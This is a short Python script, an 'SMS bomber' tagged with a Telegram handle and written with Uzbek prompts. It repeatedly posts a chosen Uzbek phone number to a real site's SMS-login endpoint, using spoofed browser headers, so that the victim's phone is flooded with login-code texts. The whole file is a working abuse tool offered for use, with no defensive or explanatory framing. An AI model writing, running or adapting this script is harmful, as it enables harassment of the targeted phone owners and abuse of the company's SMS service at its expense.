import requests

#Telegram @CyberKnightuz

def send_sms(phone_number, sms_count):
    url = 'https://api.100k.uz/api/auth/sms-login?'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer null',
        'Origin': 'https://admin.100k.uz',
        'Referer': 'https://admin.100k.uz/',
        'Connection': 'close',
    }
    payload = {
        'phone': '+998{}'.format(phone_number),
        'username': '+998 ({}) {}-{}-{}'.format(phone_number[:2], phone_number[2:5], phone_number[5:8], phone_number[8:])
    }

#Telegram @CyberKnightuz

    for _ in range(sms_count):
        response = requests.post(url, headers=headers, json=payload)
        print("SMS yuborildi => ", phone_number)
        
#Telegram @CyberKnightuz
        
def main():
    phone_number = input("Telefon raqamingizni kiriting ( masalan: 901234567): ")
    sms_count = int(input("Nechta SMS yuborasiz: "))
    send_sms(phone_number, sms_count)

if __name__ == "__main__":
    main()
